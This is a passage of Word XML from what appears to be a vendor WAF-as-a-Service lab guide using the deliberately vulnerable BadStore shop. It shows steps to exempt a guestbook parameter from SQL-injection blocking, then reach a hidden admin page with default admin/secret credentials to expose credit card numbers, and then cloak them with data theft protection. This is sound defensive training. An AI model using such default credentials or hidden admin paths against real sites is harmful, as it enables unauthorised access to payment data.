          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E2BD57" w14:textId="77777777" w:rsidR="003A79F9" w:rsidRDefault="003A79F9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0670459F" w14:textId="7C1CE386" w:rsidR="00163BC3" w:rsidRDefault="00163BC3" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Hover over the “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>badstore.cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">” profile, and click the “Add Parameter” icon </w:t>
      </w:r>
      <w:r w:rsidR="002451E6">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BE6700E" wp14:editId="41C3CC7F">
            <wp:extent cx="2410326" cy="1205163"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851361" name="Picture 144985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61"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId56">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2410326" cy="1205163"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="550F0571" w14:textId="77777777" w:rsidR="007258CC" w:rsidRPr="007258CC" w:rsidRDefault="005B056E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For </w:t>
      </w:r>
      <w:r w:rsidRPr="005B056E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Parameter Name</w:t>
      </w:r>
      <w:r>
        <w:t>, e</w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve">nter </w:t>
      </w:r>
      <w:r w:rsidR="007258CC" w:rsidRPr="007258CC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>comments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B7005E" w14:textId="7306C387" w:rsidR="00163BC3" w:rsidRDefault="007258CC" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is the </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3" w:rsidRPr="007258CC">
        <w:t>parameter</w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve"> which was blocked in the firewall log </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E406979" w14:textId="77777777" w:rsidR="00ED6D1A" w:rsidRDefault="4100063F" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8">
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r w:rsidR="21E3A6DB">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8" w:rsidRPr="00ED6D1A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Parameter Class</w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8">
        <w:t xml:space="preserve">, select </w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8" w:rsidRPr="00ED6D1A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Custom</w:t>
      </w:r>
      <w:r w:rsidR="4A1917D6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9146E0" w14:textId="6D0AA056" w:rsidR="00163BC3" w:rsidRDefault="00ED6D1A" w:rsidP="00ED6D1A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ncheck</w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8">
        <w:t xml:space="preserve"> “Block SQL </w:t>
      </w:r>
      <w:r w:rsidR="004C5DB5">
        <w:t>Injection”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but check all the other Block types</w:t>
      </w:r>
      <w:r w:rsidR="004C5DB5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="38DD7BB8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="40AF8625">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77AA75F9" wp14:editId="02ADC723">
            <wp:extent cx="2755900" cy="2374666"/>
            <wp:effectExtent l="0" t="0" r="6350" b="6985"/>
            <wp:docPr id="57603019" name="Picture 576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0301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55900" cy="2374666"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="38DD7BB8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A71415" w14:textId="1E91489B" w:rsidR="00163BC3" w:rsidRDefault="38DD7BB8" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="03E60FA1" w:rsidRPr="59C4101A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Add </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38801F71" w14:textId="77777777" w:rsidR="00B32D38" w:rsidRDefault="474FD0CC" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:r w:rsidR="5680436F" w:rsidRPr="00B32D38">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Sign</w:t>
      </w:r>
      <w:r w:rsidRPr="00B32D38">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="5680436F" w:rsidRPr="00B32D38">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Guestbook</w:t>
      </w:r>
      <w:r w:rsidR="5680436F">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>add the same comment as before</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2169689C" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="00B32D38" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Notice </w:t>
      </w:r>
      <w:r w:rsidR="474FD0CC">
        <w:t xml:space="preserve">you </w:t>
      </w:r>
      <w:r w:rsidR="08A48E3B">
        <w:t>are not blocked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this time. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DEF925" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="74" w:name="_Toc609263783"/>
      <w:bookmarkStart w:id="75" w:name="_Toc72791977"/>
      <w:r>
        <w:t>Confirming Credit Card PII Leakage Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="74"/>
      <w:bookmarkEnd w:id="75"/>
    </w:p>
    <w:p w14:paraId="7C08DD6D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r w:rsidRPr="006D1E78">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Scenario</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: PII stands for Personally Identifiable Information.  We were showing off our reporting system to our auditor last week.  We logged into the site’s admin interface by going to the </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>“Login/Register</w:t>
      </w:r>
      <w:r>
        <w:t>” page, entering “</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:t>” in the username box and “</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>secret</w:t>
      </w:r>
      <w:r>
        <w:t>” in the password box.  Then we went to the Super-Secret Administration Menu by navigating to /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>badstore.cgi?action</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">admin </w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">  We chose “</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>View Sales Reports</w:t>
      </w:r>
      <w:r>
        <w:t>” and clicked “</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Do It</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.”  Our auditor told us we were in danger of failing the audit because we were showing full credit card numbers, and PCI compliance, and were in danger of legal consequences. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B238865" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="0015168C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId58" w:history="1">
        <w:r w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D3476D1" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click on </w:t>
      </w:r>
      <w:r w:rsidRPr="006D1E78">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login/Register</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BEE79A" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Login as </w:t>
      </w:r>
      <w:r w:rsidRPr="006D1E78">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>admin / secret</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C7B0D9" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Manually change to URL to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">CNAME </w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>badstore.cgi?action</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=admin. For example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId59" w:history="1">
        <w:r w:rsidRPr="00BC761E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/cgi-bin/badstore.cgi?action=admin</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="25D84DA0" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Choose </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>View Sales Reports</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Do It</w:t>
      </w:r>
      <w:commentRangeStart w:id="76"/>
      <w:commentRangeEnd w:id="76"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="76"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7626BB6E" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A5AFD2F" wp14:editId="4FAFC7C5">
            <wp:extent cx="5943600" cy="122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0">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="1228090"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F14FAA" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you can see, Credit Card numbers are being shown.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="328A0B65" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">WAF-as-Service can prevent this PII leakage from occurring. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E3E4F9" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="65D42901" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1735F1A5" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="78" w:name="_Toc1405684293"/>
      <w:bookmarkStart w:id="79" w:name="_Toc72791978"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Blocking PII Leakage</w:t>
      </w:r>
      <w:bookmarkEnd w:id="78"/>
      <w:bookmarkEnd w:id="79"/>
    </w:p>
    <w:p w14:paraId="0B83F819" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Add the Data Theft Protection component.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D1908D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="258FA649" wp14:editId="12EB1092">
            <wp:extent cx="4197350" cy="1636966"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="1023952791" name="Picture 10239527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95279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7350" cy="1636966"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A35746" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Turn on Data Theft Protection if it is not already On</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F580168" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click Add Element.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3AB89D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enter “CC” for the Data Theft Element Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC943F8" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Choose </w:t>
      </w:r>
      <w:r w:rsidRPr="00083507">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Credit Cards</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for Identity Theft Type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4127E7" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Select </w:t>
      </w:r>
      <w:r w:rsidRPr="00083507">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Cloak</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the action.  Cloak will obscure the credit card number so the customer can pass the audit.  Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00083507">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A4CC91" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Wait a few minutes for WAF-as-a-Service to update.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1848B610" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Refresh the “</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>View Sales Reports</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">” until you see the Credit Card numbers have been obscured. The few Credit Card numbers that are not obscured are not actually valid credit card numbers </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EE7608B" wp14:editId="6D6F947A">
            <wp:extent cx="5378450" cy="1170502"/>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5378450" cy="1170502"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="387D400E" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="380F346D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F95265F" w14:textId="706D003B" w:rsidR="00265211" w:rsidRDefault="00265211" w:rsidP="000C08D8"/>
    <w:p w14:paraId="6AB7E6FF" w14:textId="5BA9D5F3" w:rsidR="00265211" w:rsidRDefault="6BE998EA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="80" w:name="_Toc1977534715"/>
      <w:bookmarkStart w:id="81" w:name="_Toc72791980"/>
      <w:r>
        <w:t xml:space="preserve">Adding an Exception for a </w:t>
      </w:r>
      <w:r w:rsidR="00D450FF">
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="0005619E">
        <w:t xml:space="preserve">alse </w:t>
      </w:r>
      <w:commentRangeStart w:id="82"/>
      <w:r w:rsidR="0005619E">
        <w:t>Positive</w:t>
      </w:r>
      <w:commentRangeEnd w:id="82"/>
      <w:r w:rsidR="00D450FF">
        <w:commentReference w:id="82"/>
      </w:r>
      <w:r w:rsidR="00D450FF">
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r w:rsidR="00FF500C">
        <w:t>File Uploads</w:t>
      </w:r>
      <w:bookmarkEnd w:id="80"/>
      <w:bookmarkEnd w:id="81"/>
    </w:p>
    <w:p w14:paraId="6004CD25" w14:textId="6BE48226" w:rsidR="001713D4" w:rsidRPr="00FB46C8" w:rsidRDefault="6FDB7004" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Scenario</w:t>
      </w:r>
      <w:r w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="430E6CD2" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>One of our</w:t>
      </w:r>
